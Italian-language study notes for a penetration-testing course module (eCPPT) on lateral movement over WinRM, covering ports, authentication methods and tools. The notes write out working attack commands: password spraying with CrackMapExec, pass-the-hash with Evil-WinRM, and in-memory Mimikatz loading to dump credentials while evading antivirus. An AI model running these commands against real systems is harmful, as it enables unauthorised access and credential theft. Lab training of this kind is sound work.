# 08 — Lateral Movement via WinRM

> **Modulo:** Lateral Movement & Pivoting · **Video:** 8/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [08_Lateral Movement via WinRM.txt](08_Lateral Movement via WinRM.txt) · [08_Lateral Movement via WinRM.srt](08_Lateral Movement via WinRM.srt)

## Concetti chiave

- **WinRM (Windows Remote Management)** = implementazione Microsoft del WS-Management Protocol.
- Porte: **5985** (HTTP, no TLS) · **5986** (HTTPS, con TLS cert).
- Pensato per system admin (sostituto di SSH per Windows) — frequentemente lasciato aperto in produzione.
- Auth methods: **NTLM** (default), **Kerberos** (in AD), **Basic** (debole, solo HTTPS), **Negotiate**.
- Privilegi richiesti: utente in **local Administrators** OR gruppo **Remote Management Users** (analogo a *Remote Desktop Users* per RDP).
- Tool principali: **Evil-WinRM** (de facto), **CrackMapExec** (`winrm`), **PowerShell Remoting** (`Enter-PSSession`).
- **PowerShell Remoting** richiede `Enable-PSRemoting` esplicito sul target, anche se WinRM è attivo.

## Spiegazione approfondita

### WinRM auth methods
| Method | Note |
|---|---|
| **NTLM** | Standard non-domain, challenge-response |
| **Kerberos** | Domain-joined, preferito in AD |
| **Basic** | username:password base64 — disabilitato di default, **solo su HTTPS** |
| **Negotiate** | Sceglie Kerberos se possibile, fallback NTLM |

### Privilegi richiesti
- **Local Administrators** → exec come admin.
- **Remote Management Users** group → può autenticarsi WinRM ed eseguire comandi con **i propri privilegi** (non admin). Analogia con *Remote Desktop Users* per RDP.

### I 3 tool a confronto

| Tool | Best for | Note |
|---|---|---|
| **Evil-WinRM** | Shell interattiva + script loading | De facto standard offensive |
| **CrackMapExec winrm** | Spray, validation, exec comandi singoli | No shell interattiva |
| **PowerShell Remoting** (`Enter-PSSession`) | Living-off-the-land, basic admin | Richiede `Enable-PSRemoting` sul target |

### Evil-WinRM superpoteri
- Shell PowerShell remota completa.
- Loading di script PowerShell **in memoria** (`-s <folder>`) → no disk write.
- Loading di **C# executables** (`-e <folder>`).
- Supporta NTLM hash (PTH-WinRM): `-H <hash>`.
- Realm/Kerberos: `-r <domain>`.
- SSL: `-S`.

## Comandi & strumenti

```bash
# Pre-check
nmap -p 5985 -sV <TARGET_IP>
nmap -p 5986 -sV <TARGET_IP>   # SSL variant

# CME WinRM: spray
crackmapexec winrm <TARGET_IP> -u administrator \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# CME WinRM: valida credenziale
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321'

# CME WinRM: esegui comando
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321' -x 'whoami'
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321' -X 'Get-Process'

# Evil-WinRM con password
evil-winrm -u administrator -p 'rock_and_roll_123321' -i <TARGET_IP>

# Evil-WinRM con NTLM hash (PTH)
evil-winrm -u administrator -H <NT_HASH> -i <TARGET_IP>

# Evil-WinRM con script loading
evil-winrm -u administrator -p '...' -i <TARGET_IP> -s /root/Desktop/tools/scripts

# Dentro Evil-WinRM dopo -s <folder>:
Invoke-Mimikatz.ps1
# → carica lo script
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Evil-WinRM SSL (5986)
evil-winrm -u administrator -p '...' -i <TARGET_IP> -S

# Evil-WinRM realm (Kerberos AD)
evil-winrm -u administrator -p '...' -i <TARGET_IP> -r <DOMAIN>

# PowerShell Remoting (da Kali, pwsh installato)
pwsh
$cred = Get-Credential   # inserisce administrator + password
Enter-PSSession -ComputerName <TARGET_IP> -Authentication Negotiate -Credential $cred

# Abilitazione PSRemoting sul target (admin)
Enable-PSRemoting -Force
```

## Esempi pratici

```bash
# Workflow lab (dal video):

# 1. Scan
nmap -p 5985 -sV <TARGET_IP>
# → 5985/tcp open wsman

# 2. CME: valida cred fornita
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321'
# → Pwn3d!

# 3. CME exec comando
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321' -x 'whoami'
# → administrator

# 4. Evil-WinRM shell interattiva
evil-winrm -u administrator -p 'rock_and_roll_123321' -i <TARGET_IP>
# → *Evil-WinRM* PS C:\Users\Administrator\Documents>

# 5. Evil-WinRM con script loading + Mimikatz in memoria
evil-winrm -u administrator -p 'rock_and_roll_123321' -i <TARGET_IP> \
  -s /root/Desktop/tools/scripts
# > menu
# > Invoke-Mimikatz.ps1
# (carica in memoria, ~30-60s)
# > Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
# → dump hash NTLM + clear-text

# 6. PowerShell Remoting (richiede PSRemoting abilitato sul target)
pwsh
$cred = Get-Credential
# user: administrator, pass: rock_and_roll_123321
Enter-PSSession -ComputerName <TARGET_IP> -Authentication Negotiate -Credential $cred
# Se errore "connecting failed" → manca Enable-PSRemoting sul target
# Sul target (admin PowerShell):
Enable-PSRemoting -Force
# Riprova → [<TARGET_IP>]: PS C:\Users\Administrator\Documents>
```

## Punti d'attenzione per l'esame eCPPT

- **Porte WinRM**: **5985 HTTP / 5986 HTTPS** — domanda fissa d'esame.
- **WinRM ≠ PowerShell Remoting**: PS Remoting è costruito su WinRM ma serve `Enable-PSRemoting` esplicito.
- **Privilegi**: local admin OR membro di **Remote Management Users**.
- **Evil-WinRM** è lo strumento offensive standard — sapere `-u`, `-p`, `-H` (hash), `-i` (IP), `-s` (scripts), `-e` (exe), `-S` (SSL), `-r` (realm).
- **PTH-WinRM funziona** (a differenza di RDP): `evil-winrm -H <NT_HASH>`.
- **Basic auth WinRM** = base64 → considerato debole, **solo su HTTPS**.
- CME `winrm` per spray multipli host (più efficiente di Evil-WinRM).
- Loading script in memoria con Evil-WinRM `-s` = **bypass AV/disk detection**.
- Errore PS Remoting tipico: "WinRM service running but PSRemoting not enabled" → enable lato target.

## Collegamenti con altri video

- Precedente: [[07_Lateral Movement via RDP]] — altro remote access protocol.
- Prossimi: [[09_Pass-the-Hash with Metasploit]] · [[010_Pass-the-Hash with WMIExec]]
- Catch-all tool: [[06_Lateral Movement with CrackMapExec]]
- Linux comparable (SSH): [[011_Linux Lateral Movement Techniques]]
